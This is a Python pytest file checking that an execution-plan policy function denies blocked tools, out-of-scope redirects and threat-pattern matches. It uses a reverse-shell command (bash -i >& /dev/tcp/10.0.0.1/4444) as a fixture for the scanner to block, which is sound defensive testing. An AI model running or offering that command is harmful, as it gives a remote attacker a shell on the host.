"""Tier 2: #5838 段3 -- ``check_exec_plan_policy`` applies segment/redirect
policy over an already-parsed :data:`~reyn.security.exec_plan.ExecPlan`.

Real ``OpContext`` + real ``PermissionResolver`` + real ``ContextualPermission``
+ real ``ThreatScanConfig`` throughout -- no mocks (CLAUDE.md testing policy:
never fake a cheaply-constructible collaborator). Plans are built directly as
:class:`ExecSegment`/:class:`ExecChainOp`/:class:`ExecRedirect` literals rather
than through ``parse_exec_plan`` -- this module's own contract is "given an
already-parsed plan", independent of how that plan was produced (段2's own
test file already covers the parse step exhaustively).

Falsification for both checks this module wires in is a real, reproducible
denial: the tool-axis case denies via the SAME ``ContextualPermission``/
``tool_contextually_denied`` predicate #5841 wired into ``dispatch_tool``
(``tests/security/test_contextual_permission_1827.py`` is that predicate's
own falsification, not repeated here); the threat-scan case denies via the
SAME real patterns ``tests/core/test_exec_scan_1822.py`` already falsifies
against a whole op's argv, applied here per segment instead.

#5991 BLOCKING (architect co-vet, issuecomment-5578916234) added 3 more
groups here: a no-resolver redirect now DENIES rather than silently
passing (①), a segment's threat-scan outcome (ran-and-clean / skipped) is
now always distinguishable in the emitted events (②), and ``env_path`` is
a required keyword-only argument on every call (③) -- ``_ctx``'s own
``PYTHONPATH``-free real ``os.environ.get("PATH")`` is passed explicitly
below, the same as any real caller would, never left to an internal
default (there is none any more)."""
from __future__ import annotations

import os
from pathlib import Path

import pytest

from reyn.config.chat import ThreatScanConfig
from reyn.core.events.events import EventLog
from reyn.core.op_runtime.context import OpContext
from reyn.data.workspace.workspace import Workspace
from reyn.security.exec_plan import ExecChainOp, ExecRedirect, ExecSegment
from reyn.security.exec_plan_policy import check_exec_plan_policy
from reyn.security.permissions.effective import ContextualPermission
from reyn.security.permissions.permissions import PermissionDecl, PermissionResolver
from tests._support.events import collect_events, settle

# A reverse-shell argv shape test_exec_scan_1822.py's own
# test_exec_patterns_detect_malicious already falsifies against
# scan_for_threats directly (pattern_id "reverse_shell_devtcp") -- reused
# here as one segment's own argv, joined the same way _check_segment joins
# it ("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1").
_REVERSE_SHELL_ARGV = ("bash", "-i", ">&", "/dev/tcp/10.0.0.1/4444", "0>&1")

# The real PATH this process has -- passed explicitly to every call below
# (BLOCKING ③: check_exec_plan_policy no longer has an internal fallback).
_REAL_PATH = os.environ.get("PATH")


async def _check(
    plan, ctx, *, env_path: "str | None" = _REAL_PATH, cwd: "str | None" = None
) -> None:
    """Thin wrapper naming *env_path*/*cwd*'s defaults explicitly at the
    call site, so a test that overrides one (the ③ witness below) reads
    as a deliberate override, not an accidental omission. ``cwd=None`` is
    a legitimate real value (``resolve_real_executable``'s own documented
    "no cwd" case) -- callers below that need a specific one pass it."""
    await check_exec_plan_policy(plan, ctx, env_path=env_path, cwd=cwd)


def _ctx(
    tmp_path: Path,
    *,
    contextual: "ContextualPermission | None" = None,
    threat_scan: "ThreatScanConfig | None" = None,
    permission_resolver: "PermissionResolver | None | object" = "unset",
    config: "dict | None" = None,
) -> "tuple[OpContext, list]":
    project_root = tmp_path / "proj"
    project_root.mkdir(parents=True, exist_ok=True)
    events = EventLog()
    collected = collect_events(events)
    workspace = Workspace(events=events, base_dir=project_root)
    resolver: "PermissionResolver | None"
    if permission_resolver == "unset":
        resolver = PermissionResolver(
            config_permissions=config or {}, project_root=project_root, interactive=False,
        )
    else:
        resolver = permission_resolver  # type: ignore[assignment]
    ctx = OpContext(
        workspace=workspace,
        events=events,
        permission_decl=PermissionDecl(),
        permission_resolver=resolver,
        actor="test",
        contextual_permission=contextual,
        threat_scan=threat_scan,
    )
    return ctx, collected


@pytest.mark.asyncio
async def test_segment_with_contextually_denied_binary_is_rejected(tmp_path: Path) -> None:
    """Tier 2: a segment whose resolved argv[0] basename is on the SAME
    per-session tool_deny set #5841 checks for a whole tool call is denied
    here too -- the exact predicate reuse this module's own docstring
    claims (``tool_contextually_denied`` against ``ctx.contextual_
    permission``), not a re-derived one."""
    ctx, _collected = _ctx(
        tmp_path, contextual=ContextualPermission(tool_deny=frozenset({"true"})),
    )
    plan = [ExecSegment(argv=("/usr/bin/true",))]

    with pytest.raises(PermissionError, match="true"):
        await _check(plan, ctx)


@pytest.mark.asyncio
async def test_a_tool_axis_denial_emits_an_event_naming_the_binary_in_fields(
    tmp_path: Path,
) -> None:
    """Tier 2: #6016 ① -- a tool-axis denial now leaves an
    ``exec_tool_axis_denied`` event carrying the ORIGINAL argv[0], the
    RESOLVED absolute path, and the effective (basename) name checked
    against the deny set -- all as separate FIELDS, so a reader can
    extract WHICH binary was denied without parsing ``reason``'s own
    English sentence (the acceptance criterion lead-coder's own ruling
    named explicitly: ``tool_failed.message`` alone is not "追える")."""
    ctx, collected = _ctx(
        tmp_path, contextual=ContextualPermission(tool_deny=frozenset({"true"})),
    )
    plan = [ExecSegment(argv=("/usr/bin/true", "--extra"))]

    with pytest.raises(PermissionError):
        await _check(plan, ctx)

    await settle(ctx.events)
    (denied,) = [e for e in collected if e.type == "exec_tool_axis_denied"]
    assert denied.data["argv0"] == "/usr/bin/true"
    assert denied.data["resolved"] == "/usr/bin/true"
    assert denied.data["effective_name"] == "true"
    assert "true" in denied.data["reason"]


@pytest.mark.asyncio
async def test_an_allowed_segment_emits_no_tool_axis_event_either_direction(
    tmp_path: Path,
) -> None:
    """Tier 2: #6016 ①'s own explicit scope -- the "allowed" side gets NO
    event (architect's structural reason, PR #6030 co-vet: the tool axis
    has no "did not run" state to distinguish, unlike threat_scan, and
    the allowed side is already recorded by 段5's own `plan` field --
    see `exec_plan_policy.py`'s own module docstring, "#6016 ①"). An
    ordinary, un-denied segment leaves the event log with no
    ``exec_tool_axis_denied`` entry at all -- not even a
    ``blocked=False``-shaped one."""
    ctx, collected = _ctx(tmp_path)
    plan = [ExecSegment(argv=("/usr/bin/true",))]

    await _check(plan, ctx)  # does not raise

    await settle(ctx.events)
    assert not [e for e in collected if e.type == "exec_tool_axis_denied"]


@pytest.mark.asyncio
async def test_segment_not_on_the_deny_set_passes(tmp_path: Path) -> None:
    """Tier 2: FP gate -- an ordinary segment under a narrowing that denies
    a DIFFERENT name passes silently (never elevates, never over-denies)."""
    ctx, _collected = _ctx(
        tmp_path, contextual=ContextualPermission(tool_deny=frozenset({"rm"})),
    )
    plan = [ExecSegment(argv=("/usr/bin/true",))]

    await _check(plan, ctx)  # does not raise


@pytest.mark.asyncio
async def test_no_contextual_narrowing_leaves_the_tool_axis_unconstrained(tmp_path: Path) -> None:
    """Tier 2: ``contextual_permission=None`` (no narrowing at all, the
    overwhelming majority of sessions) never denies on the tool axis --
    mirrors ``tool_contextually_denied``'s own ``contextual is None ->
    False`` inertness."""
    ctx, _collected = _ctx(tmp_path, contextual=None)
    plan = [ExecSegment(argv=("/usr/bin/true",))]

    await _check(plan, ctx)  # does not raise


@pytest.mark.asyncio
async def test_absolute_path_alias_still_resolves_to_the_denied_basename(tmp_path: Path) -> None:
    """Tier 2: the Codex #28732 basename-bypass class this module's own
    docstring names -- a segment naming the binary by an ABSOLUTE PATH
    (not the bare command a caller might expect the deny-set to key on)
    is still resolved to its basename before the tool-axis check, so an
    alias route does not evade a deny already in force for the bare name."""
    ctx, _collected = _ctx(
        tmp_path, contextual=ContextualPermission(tool_deny=frozenset({"true"})),
    )
    plan = [ExecSegment(argv=("/usr/bin/true", "--extra"))]

    with pytest.raises(PermissionError):
        await _check(plan, ctx)


@pytest.mark.asyncio
async def test_a_bare_name_resolves_via_the_given_env_path_and_is_denied(tmp_path: Path) -> None:
    """Tier 2: a BARE command name (PATH search required, not an absolute
    path like the test above) resolved against the given ``env_path``
    finds the real ``/usr/bin/true`` and is denied on its basename, same
    as the absolute-path case above."""
    ctx, _collected = _ctx(
        tmp_path, contextual=ContextualPermission(tool_deny=frozenset({"true"})),
    )
    plan = [ExecSegment(argv=("true",))]  # bare name -- PATH search required

    with pytest.raises(PermissionError):
        await _check(plan, ctx, env_path=_REAL_PATH)


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "kwargs",
    [
        pytest.param({"cwd": None}, id="env_path_omitted_alone"),
        pytest.param({"env_path": _REAL_PATH}, id="cwd_omitted_alone"),
        pytest.param({}, id="both_omitted"),
    ],
)
async def test_omitting_env_path_or_cwd_is_a_typeerror_not_a_silent_default(
    tmp_path: Path, kwargs: dict,
) -> None:
    """Tier 2: #5991 BLOCKING ③ witness -- the actual fix is that there is
    no internal fallback left to exercise for EITHER parameter
    independently, not just for the pair together. lead-coder's own strip
    (issuecomment-5579302738): giving ``env_path`` alone a default of
    ``None`` still left the OLD (both-omitted) form of this test green —
    the assertion could not tell which of the two arguments was actually
    load-bearing, so half of "omission is a TypeError" went unverified.
    Parametrized 3 ways so ① and ② go red SEPARATELY (the requirement
    lead-coder named explicitly): omitting ``env_path`` alone, omitting
    ``cwd`` alone, and omitting both. Calling ``check_exec_plan_policy``
    directly here (bypassing this file's own ``_check`` wrapper, which
    always supplies both) is deliberate — these are the only calls in
    this file that must NOT compile a working call."""
    from reyn.security.exec_plan_policy import check_exec_plan_policy as _raw

    ctx, _collected = _ctx(tmp_path)
    plan = [ExecSegment(argv=("/usr/bin/true",))]

    with pytest.raises(TypeError):
        await _raw(plan, ctx, **kwargs)  # type: ignore[call-arg]


@pytest.mark.asyncio
async def test_threat_scan_blocks_a_reverse_shell_segment(tmp_path: Path) -> None:
    """Tier 2: a segment whose own joined argv matches a real block-severity
    threat pattern (the same ``reverse_shell_devtcp`` pattern ``tests/core/
    test_exec_scan_1822.py`` falsifies) is denied, and both an
    ``exec_threat_blocked`` and an ``exec_threat_scanned`` (match_count>0,
    blocked=True) audit-event are emitted -- mirrors ``sandboxed_exec.py``'s
    own pre-exec scan, applied per segment."""
    ctx, collected = _ctx(tmp_path, threat_scan=ThreatScanConfig())
    plan = [ExecSegment(argv=_REVERSE_SHELL_ARGV)]

    with pytest.raises(PermissionError, match="reverse_shell_devtcp"):
        await _check(plan, ctx)

    await settle(ctx.events)
    assert any(e.type == "exec_threat_blocked" for e in collected)
    (scanned,) = [e for e in collected if e.type == "exec_threat_scanned"]
    assert scanned.data["blocked"] is True
    assert scanned.data["match_count"] > 0


@pytest.mark.asyncio
async def test_threat_scan_clean_segment_still_leaves_a_scanned_event(tmp_path: Path) -> None:
    """Tier 2: #5991 BLOCKING ② -- an ordinary, clean segment (scanned, 0
    matches) emits ``exec_threat_scanned`` with ``match_count=0``,
    ``blocked=False`` -- the "two zeros" fix: this event's PRESENCE is
    what tells a later ``.reyn/events`` read "the scan ran", independent
    of whether it found anything."""
    ctx, collected = _ctx(tmp_path, threat_scan=ThreatScanConfig())
    plan = [ExecSegment(argv=("ls", "-la"))]

    await _check(plan, ctx)  # does not raise

    await settle(ctx.events)
    (scanned,) = [e for e in collected if e.type == "exec_threat_scanned"]
    assert scanned.data["match_count"] == 0
    assert scanned.data["blocked"] is False
    assert not any(e.type == "exec_threat_scan_skipped" for e in collected)


@pytest.mark.asyncio
async def test_threat_scan_disabled_lets_the_same_segment_pass_and_emits_skipped(
    tmp_path: Path,
) -> None:
    """Tier 2: falsification gate, paired with the two tests above -- the
    SAME reverse-shell segment, with scanning disabled, is NOT blocked
    (the scan is load-bearing when enabled) AND leaves an
    ``exec_threat_scan_skipped`` event (reason="disabled"), never an
    ``exec_threat_scanned`` one -- #5991 BLOCKING ②'s other half: the
    SKIP itself must also be a positive, distinguishable record."""
    ctx, collected = _ctx(tmp_path, threat_scan=ThreatScanConfig(enabled=False))
    plan = [ExecSegment(argv=_REVERSE_SHELL_ARGV)]

    await _check(plan, ctx)  # does not raise

    await settle(ctx.events)
    (skipped,) = [e for e in collected if e.type == "exec_threat_scan_skipped"]
    assert skipped.data["reason"] == "disabled"
    assert not any(e.type == "exec_threat_scanned" for e in collected)


@pytest.mark.asyncio
async def test_no_threat_scan_config_is_a_noop_and_emits_skipped_not_configured(
    tmp_path: Path,
) -> None:
    """Tier 2: ``threat_scan=None`` (the ``OpContext`` default) skips the
    scan and records ``reason="not_configured"`` -- distinguishes an
    operator's deliberate ``enabled=False`` from a caller that never wired
    a config at all, the two different "why wasn't this scanned" stories
    #5991 BLOCKING ② asked to be told apart."""
    ctx, collected = _ctx(tmp_path, threat_scan=None)
    plan = [ExecSegment(argv=_REVERSE_SHELL_ARGV)]

    await _check(plan, ctx)  # does not raise

    await settle(ctx.events)
    (skipped,) = [e for e in collected if e.type == "exec_threat_scan_skipped"]
    assert skipped.data["reason"] == "not_configured"


@pytest.mark.asyncio
async def test_write_redirect_outside_scope_is_denied(tmp_path: Path) -> None:
    """Tier 2: an ``ExecRedirect(">")`` target outside the configured write
    scope is denied through the EXISTING ``require_file_write`` gate --
    the same primitive/scope ``op_runtime/file.py`` already enforces, no
    new file-permission concept. ``interactive=False``/no bus -> a
    non-interactive deny, matching ``require_file_write``'s own documented
    fallback."""
    ctx, _collected = _ctx(tmp_path)
    plan = [ExecRedirect(op=">", path="/etc/definitely-outside-scope.txt")]

    with pytest.raises(PermissionError, match="was not approved"):
        await _check(plan, ctx)


@pytest.mark.asyncio
async def test_write_redirect_inside_default_scope_is_allowed(tmp_path: Path) -> None:
    """Tier 2: FP gate -- a redirect INSIDE the default write scope
    (``<zone-root>/.reyn``, ``require_file_write``'s own documented
    default) passes silently, proving the check above denies on SCOPE, not
    unconditionally."""
    ctx, _collected = _ctx(tmp_path)
    plan = [ExecRedirect(op=">", path=".reyn/out.txt")]

    await _check(plan, ctx)  # does not raise


@pytest.mark.asyncio
async def test_a_redirect_path_matching_a_threat_pattern_is_denied(tmp_path: Path) -> None:
    """Tier 2: #6007 BLOCKING (architect co-vet, issuecomment-5580912677)
    -- a redirect's own PATH is threat-scanned too, not just a segment's
    argv. Argv-mode's whole-op scan (``sandboxed_exec.py``) sees every
    token including a redirect target; this module's earlier version
    never touched ``ExecRedirect.path`` at all -- a surface unique to
    reaching a redirect through THIS module (cmd-mode) that was left
    unscanned only here. The reverse-shell pattern (a plain ``/dev/tcp/``
    substring match) fits directly inside a redirect target path."""
    ctx, collected = _ctx(tmp_path, threat_scan=ThreatScanConfig())
    plan = [ExecRedirect(op=">", path="/dev/tcp/10.0.0.1/4444")]

    with pytest.raises(PermissionError, match="reverse_shell_devtcp"):
        await _check(plan, ctx)

    await settle(ctx.events)
    (scanned,) = [e for e in collected if e.type == "exec_threat_scanned"]
    assert scanned.data["blocked"] is True
    assert scanned.data["argv"] == ["/dev/tcp/10.0.0.1/4444"]


@pytest.mark.asyncio
async def test_the_redirect_threat_scan_runs_even_with_no_permission_resolver(
    tmp_path: Path,
) -> None:
    """Tier 2: the redirect threat-scan does not depend on a
    ``permission_resolver`` being wired -- it denies (with the THREAT
    reason, not the fail-closed "no permission_resolver" reason from
    #5991 BLOCKING ①) even when ``permission_resolver=None``, proving the
    scan runs BEFORE the resolver-presence check, not after."""
    ctx, _collected = _ctx(
        tmp_path, permission_resolver=None, threat_scan=ThreatScanConfig(),
    )
    plan = [ExecRedirect(op=">", path="/dev/tcp/10.0.0.1/4444")]

    with pytest.raises(PermissionError, match="reverse_shell_devtcp"):
        await _check(plan, ctx)


@pytest.mark.asyncio
async def test_read_redirect_outside_scope_is_denied(tmp_path: Path) -> None:
    """Tier 2: an ``ExecRedirect("<")`` target outside the configured read
    scope goes through ``require_file_read``, the sibling gate to the
    write case above -- same primitive, opposite axis."""
    ctx, _collected = _ctx(tmp_path)
    plan = [ExecRedirect(op="<", path="/etc/definitely-outside-scope.txt")]

    with pytest.raises(PermissionError, match="was not approved"):
        await _check(plan, ctx)


@pytest.mark.asyncio
async def test_no_permission_resolver_denies_the_redirect_check_fail_closed(
    tmp_path: Path,
) -> None:
    """Tier 2: #5991 BLOCKING ① -- ``permission_resolver=None`` (a
    narrower/test-shaped context) now DENIES the redirect check rather
    than silently passing. The earlier version's ``file.py``-parity
    argument for fail-open does not hold here: this gate has zero real
    callers yet (段4 unbuilt), so there is no existing population a
    fail-open default would be protecting."""
    ctx, _collected = _ctx(tmp_path, permission_resolver=None)
    plan = [ExecRedirect(op=">", path=".reyn/would-otherwise-be-in-scope.txt")]

    with pytest.raises(PermissionError, match="no permission_resolver"):
        await _check(plan, ctx)


@pytest.mark.asyncio
async def test_a_bare_chain_op_item_is_a_noop(tmp_path: Path) -> None:
    """Tier 2: an ``ExecChainOp`` carries no policy-relevant data of its
    own -- a plan containing only one is not denied by anything (the
    segments either side of it, if any, are what carry policy)."""
    ctx, _collected = _ctx(tmp_path)
    plan = [ExecChainOp(op="|")]

    await _check(plan, ctx)  # does not raise


@pytest.mark.asyncio
async def test_a_multi_item_plan_is_checked_left_to_right_and_stops_at_the_first_denial(
    tmp_path: Path,
) -> None:
    """Tier 2: architect's own worked example (PR #5984's pinned
    ``"ls -la | grep foo > out.txt"`` shape) as an already-built plan --
    the FIRST segment (``ls``) is allowed, the SECOND (``grep``, denied by
    this test's own narrowing) is the one whose denial is raised (the
    ``match="grep"`` below, not a `ls`-shaped message) -- items are
    checked in the plan's own left-to-right order, matching every other
    ``require_*`` gate in this codebase (sequential, never collect-all).
    This test does NOT independently witness whether the trailing
    redirect item is reached or skipped when an earlier item denies (lead-
    coder co-vet, issuecomment-5579176478: a strip of the redirect check
    entirely stays green here, since ``grep``'s own denial already fires
    first) -- see the loop's own short-circuit in ``check_exec_plan_
    policy`` for that guarantee instead."""
    ctx, _collected = _ctx(
        tmp_path, contextual=ContextualPermission(tool_deny=frozenset({"grep"})),
    )
    plan = [
        ExecSegment(argv=("ls", "-la")),
        ExecChainOp(op="|"),
        ExecSegment(argv=("grep", "foo")),
        ExecRedirect(op=">", path="out.txt"),
    ]

    with pytest.raises(PermissionError, match="grep"):
        await _check(plan, ctx)


@pytest.mark.asyncio
async def test_the_same_plan_with_no_narrowing_passes_every_item(tmp_path: Path) -> None:
    """Tier 2: FP gate, sibling of the test above -- the identical plan
    with no narrowing on either segment name and both paths in scope
    passes through every item without raising."""
    ctx, _collected = _ctx(tmp_path)
    plan = [
        ExecSegment(argv=("ls", "-la")),
        ExecChainOp(op="|"),
        ExecSegment(argv=("grep", "foo")),
        ExecRedirect(op=">", path=".reyn/out.txt"),
    ]

    await _check(plan, ctx)  # does not raise
